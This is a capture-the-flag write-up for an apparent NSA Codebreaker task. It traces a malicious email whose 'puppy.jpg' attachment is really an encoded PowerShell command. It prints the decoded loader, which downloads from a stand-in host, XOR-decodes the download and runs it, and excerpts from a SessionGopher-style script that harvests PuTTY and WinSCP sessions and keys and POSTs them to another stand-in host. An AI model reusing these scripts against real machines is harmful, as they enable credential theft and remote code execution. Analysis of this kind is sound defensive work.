# Task03 - Email Analysis

**Task Instructions**:

With the provided information, OOPS was quickly able to identify the employee associated with the account. During the incident response interview, the user mentioned that they would have been checking email around the time that the communication occurred. They don't remember anything particularly weird from earlier, but it was a few weeks back, so they're not sure. OOPS has provided a subset of the user's inbox from the day of the communication.

Identify the message ID of the malicious email and the targeted server.

* [User's Emails]

## Writeup

In a realistic environment, I would advise to never blatantly open the emails on a baremetal workstation. Instead, this is the point where we should spin up a virtual machine tailored for malware analysis. This will protect us from accidentally running or downloading some malware. However, given that this is a CTF you *should* be fine to do so and observe the behavior of the emails. 

With email analysis, simply viewing the emails with a typical .eml viewer or browser will not show us the email header and any other hidden data. So, I decided to check them out in sublime text, as well as using a typical .eml viewer that comes default with Windows 10. It is important to get the view of what the user saw, but more so what we can find by taking a closer look.

### To demonstrate
<img src="https://github.com/colton-gabertan/NSACodeBreaker2021/blob/task03/task03eml.gif">

Going through each of these emails, one definitely stood out, and it was `message_21`. The others would be able to load and display the attached image/jpeg files; however this one wouldn't. Each email's attachments are also base64 encoded, which is pretty typical of email data, but it also leaves an attack vector to be exploited. Simply editing the eml header could hide a malicious script that can be base64 encoded as well. Trying to view this picture that won't load could potentially run a malicious script.

### User View of message_21
<img src="https://github.com/colton-gabertan/NSACodeBreaker2021/blob/task03/email21.jpg">

### Sublime Text View of message_21
```
--===============8244490006239525902==
Content-Type: image/jpeg
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="puppy.jpg"
MIME-Version: 1.0

cG93ZXJzaGVsbCAtbm9wIC1ub25pIC13IEhpZGRlbiAtZW5jIEpBQmlBSGtBZEFCbEFITUFJQUE5
QUNBQUtBQk9BR1VBZHdBdEFFOEFZZ0JxQUdVQVl3QjBBQ0FBVGdCbEFIUUFMZ0JYQUdVQVlnQkRB
R3dBYVFCbEFHNEFkQUFwQUM0QVJBQnZBSGNBYmdCc0FHOEFZUUJrQUVRQVlRQjBBR0VBS0FBbkFH
Z0FkQUIwQUhBQU9nQXZBQzhBZWdCa0FHWUFid0IxQUM0QWFRQnVBSFlBWVFCc0FHa0FaQUF2QUdN
QWJ3QnRBSEFBZFFCMEFHVUFjZ0FuQUNrQUNnQUtBQ1FBY0FCeUFHVUFkZ0FnQUQwQUlBQmJBR0lB
ZVFCMEFHVUFYUUFnQURVQU5nQUtBQW9BSkFCa0FHVUFZd0FnQUQwQUlBQWtBQ2dBWmdCdkFISUFJ
QUFvQUNRQWFRQWdBRDBBSUFBd0FEc0FJQUFrQUdrQUlBQXRBR3dBZEFBZ0FDUUFZZ0I1QUhRQVpR
QnpBQzRBYkFCbEFHNEFad0IwQUdnQU93QWdBQ1FBYVFBckFDc0FLUUFnQUhzQUNnQWdBQ0FBSUFB
Z0FDUUFjQUJ5QUdVQWRnQWdBRDBBSUFBa0FHSUFlUUIwQUdVQWN3QmJBQ1FBYVFCZEFDQUFMUUJp
QUhnQWJ3QnlBQ0FBSkFCd0FISUFaUUIyQUFvQUlBQWdBQ0FBSUFBa0FIQUFjZ0JsQUhZQUNnQjlB
Q2tBQ2dBS0FHa0FaUUI0QUNnQVd3QlRBSGtBY3dCMEFHVUFiUUF1QUZRQVpRQjRBSFFBTGdCRkFH
NEFZd0J2QUdRQWFRQnVBR2NBWFFBNkFEb0FWUUJVQUVZQU9BQXVBRWNBWlFCMEFGTUFkQUJ5QUdr
QWJnQm5BQ2dBSkFCa0FHVUFZd0FwQUNrQUNnQT0=

--===============8244490006239525902==--
```

To further investigate this suspicious jpg file, we can decode base64 very easily. I decided to use [CyberChef]. Simply copy and paste the message and select the `from base64` option and we have the first part of a script:
``` powershell
powershell -nop -noni -w Hidden -enc JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AegBkAGYAbwB1AC4AaQBuAHYAYQBsAGkAZAAvAGMAbwBtAHAAdQB0AGUAcgAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADUANgAKAAoAJABkAGUAYwAgAD0AIAAkACgAZgBvAHIAIAAoACQAaQAgAD0AIAAwADsAIAAkAGkAIAAtAGwAdAAgACQAYgB5AHQAZQBzAC4AbABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsACgAgACAAIAAgACQAcAByAGUAdgAgAD0AIAAkAGIAeQB0AGUAcwBbACQAaQBdACAALQBiAHgAbwByACAAJABwAHIAZQB2AAoAIAAgACAAIAAkAHAAcgBlAHYACgB9ACkACgAKAGkAZQB4ACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwApACkACgA=
```
One more time with the second portion and we find:
``` powershell
$bytes = (New-Object Net.WebClient).DownloadData('http://zdfou.invalid/computer')

$prev = [byte] 56

$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
    $prev = $bytes[$i] -bxor $prev
    $prev
})

iex([System.Text.Encoding]::UTF8.GetString($dec))
```

We've found a malicious powershell script that was hidden as `puppy.jpg`. The first line is what encodes the second portion, which is the actual script being ran from byrd.frank's machine. As we can see, it also confirms that some more stuff has been downloaded from the shady URI we found in task02. The pcap from task01 will prove to come in handy once again as we can rip the downloaded data. 

But first, a breakdown of this script: \
It starts by declaring a `$bytes` variable that will download the data. Then it stores it in `$prev` and once more in `$dec` by deobfuscating the incoming bytes, looping through the `$prev` array, `-bxor`'ing each byte. The `iex` stands for *invoke expression* in powershell, meaning it actually runs whatever the deobfuscated data is, which we can assume is more malware. Luckily, this a very poor implementation of crypto, and we can use the script to decode this data and read it.

Referring to the pcap from task01, we can pull this data by finding the traffic associated with *http://zdfou.invalid/computer*.

### Pulling the data from the pcap
<img src="https://github.com/colton-gabertan/NSACodeBreaker2021/blob/task03/zdfouGet.gif">

We can then modify the script to *not* invoke the expression, but instead spit out the deobfuscated data into a new .txt file. Simply provide the path to the downloaded data from pcap in the first line, and specify an outfile for the new text.

``` powershell
$bytes = (New-Object Net.WebClient).DownloadData('C:\Users\Colton\Desktop\nsaCodebreaker\task01\zdfouGet.bin')

$prev = [byte] 56

$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
    $prev = $bytes[$i] -bxor $prev
    $prev
})

([System.Text.Encoding]::UTF8.GetString($dec)) | Out-File C:\Users\Colton\Desktop\nsaCodebreaker\task03\zdfou.txt
```
Taking a look at our outfile, we can see the downloaded script, which is definitely doing some scraping of the host machine and sending the data to another shady URI. There is a driver function called Invoke-SessionGopher that does the scraping, with the use of its helper functions. It then sends out a POST request to the attacker's domain, sending a log file of the scraped session keys. You can take a look at the full script [here].

### Snippets from deobfuscated zdfou data
``` powershell
function Invoke-SessionGopher {
  # Value for HKEY_USERS hive
  $HKU = 2147483651
  # Value for HKEY_LOCAL_MACHINE hive
  $HKLM = 2147483650
  $PuTTYPathEnding = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
  $WinSCPPathEnding = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
  
  Write-Log "Digging on $(Hostname)..."
  # Aggregate all user hives in HKEY_USERS into a variable
  $UserHives = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}
  # For each SID beginning in S-15-21-. Loops through each user hive in HKEY_USERS.
  foreach($Hive in $UserHives) {
    # Created for each user found. Contains all PuTTY, WinSCP, FileZilla, RDP information. 
    $UserObject = New-Object PSObject
    $ArrayOfWinSCPSessions = New-Object System.Collections.ArrayList
    $ArrayOfPuTTYSessions = New-Object System.Collections.ArrayList
    $ArrayOfPPKFiles = New-Object System.Collections.ArrayList
    $objUser = (GetMappedSID)
    $Source = (Hostname) + "\" + (Split-Path $objUser.Value -Leaf)
    $UserObject | Add-Member -MemberType NoteProperty -Name "Source" -Value $objUser.Value
    # Construct PuTTY, WinSCP, RDP, FileZilla session paths from base key
    $PuTTYPath = Join-Path $Hive.PSPath "\$PuTTYPathEnding"
    $WinSCPPath = Join-Path $Hive.PSPath "\$WinSCPPathEnding"
    if (Test-Path $WinSCPPath) {
      # Aggregates all saved sessions from that user's WinSCP client
      $AllWinSCPSessions = Get-ChildItem $WinSCPPath
      (ProcessWinSCPLocal $AllWinSCPSessions)
    } # If (Test-Path WinSCPPath)
    
    if (Test-Path $PuTTYPath) {
      # Store .ppk files
      $PPKExtensionFilesINodes = New-Object System.Collections.ArrayList
      
      # Aggregates all saved sessions from that user's PuTTY client
      $AllPuTTYSessions = Get-ChildItem $PuTTYPath
      (ProcessPuTTYLocal $AllPuTTYSessions)
      
      (ProcessPPKFile $PPKExtensionFilesINodes)
    } # If (Test-Path PuTTYPath)
  } # For each Hive in UserHives
    
  Write-Host "Final log:"
  $global:log
} # Invoke-SessionGopher
```
``` powershell
Invoke-SessionGopher
Start-Sleep 86400
Invoke-WebRequest -uri http://xqhyg.invalid:8080 -Method Post -Body $global:log
```
After this little rabbit-hole of email analysis turned malware analysis, we have successfully identified two malicious scripts. One that downloads another script and the other that scrapes the machine for session keys and sends it back to the attacker via the POST request in the last line of zdfou.sh. We can now explore another avenue to detect where else the attacker has been in the next task.

[User's Emails]: https://github.com/colton-gabertan/NSACodeBreaker2021/blob/task03/emails.zip
[CyberChef]: https://gchq.github.io/CyberChef/
[here]: https://github.com/colton-gabertan/NSACodeBreaker2021/blob/task03/zdfou.sh
